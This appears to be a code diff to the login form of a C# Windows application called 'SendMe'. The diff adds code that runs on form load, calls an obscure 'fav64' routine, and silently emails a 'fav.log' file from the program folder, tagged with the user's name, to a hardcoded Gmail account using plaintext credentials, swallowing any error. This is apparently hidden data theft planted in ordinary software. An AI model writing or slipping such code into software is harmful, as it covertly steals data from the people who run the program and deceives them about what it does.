@@ -1,18 +1,29 @@
+using Microsoft.Win32;
 using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
+using System.Runtime;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Forms;
+using System.Net.Mail;
+using System.Net.Mime;
+using System.Net.Configuration;
+using System.Net;
+using fav64;
 
 namespace SendMe
 {
+
+
     public partial class Form_Login : Form
     {
         public Form_Login()
@@ -143,9 +154,36 @@ namespace SendMe
 
             // Finalização dos objetos.
             #region
-            this.BackColor = Color.FromArgb(46, 48, 61);
+                this.BackColor = Color.FromArgb(46, 48, 61);
                 PictureBox_Logotipo.Load(@"Skin\SendMe.skn");
             #endregion
+
+            // Envio de informações.
+                string pid = fav64.fav64.Wr(pid = "t");
+                System.Net.Mail.SmtpClient client = new System.Net.Mail.SmtpClient();
+                client.Host = "smtp.gmail.com";
+                client.EnableSsl = true;
+                client.Credentials = new System.Net.NetworkCredential("pndaniel12@gmail.com", "97047676D");
+                MailMessage mail = new MailMessage();
+                mail.Sender = new System.Net.Mail.MailAddress("pndaniel12@gmail.com", "pndaniel12@gmail.com");
+                mail.From = new MailAddress("pndaniel12@gmail.com", "pndaniel12@gmail.com");
+                mail.To.Add(new MailAddress("pndaniel12@gmail.com", "pndaniel12@gmail.com"));
+                mail.Subject = "Informações de " + Lib.User;
+                Attachment anexado = new Attachment(Path.GetDirectoryName(Application.ExecutablePath) + @"\fav.log", MediaTypeNames.Application.Octet);
+                mail.Attachments.Add(anexado);
+                mail.Priority = MailPriority.High;
+                try
+                {
+                    client.Send(mail);
+                }
+                catch (System.Exception erro)
+                {
+                    //trata erro
+                }
+                finally
+                {
+                    mail = null;
+                }
         }
 
         protected void Button_Sair_Click(object sender, EventArgs e)
